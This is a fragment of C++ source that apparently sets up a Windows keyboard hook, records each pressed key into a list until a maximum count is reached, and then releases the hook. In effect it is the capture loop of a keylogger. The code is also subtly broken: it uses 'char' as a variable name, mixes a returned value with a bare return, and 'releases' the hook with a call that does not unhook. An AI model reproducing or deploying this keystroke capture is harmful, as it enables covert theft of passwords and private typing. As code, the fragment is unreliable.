            keystrokes.push_back(to_string(char));
            currentTimestamp += 1;
            if (currentTimestamp >= MAX_KEYSTROKES) {
                cout << "Max keystrokes reached." << endl;
                releaseKeyboardHook();
                return;
            }
        }
    } else {  // Key is being released
        // No action needed for release event
    }
    return keyboardHook;
}

void releaseKeyboardHook() {
    if (keyboardHook) {
        keyboardHook = SetWindowsHook(NULL, NULL);
        cout << "Keyboard hook released." << endl;
    }
}

// Main function to demonstrate the hook
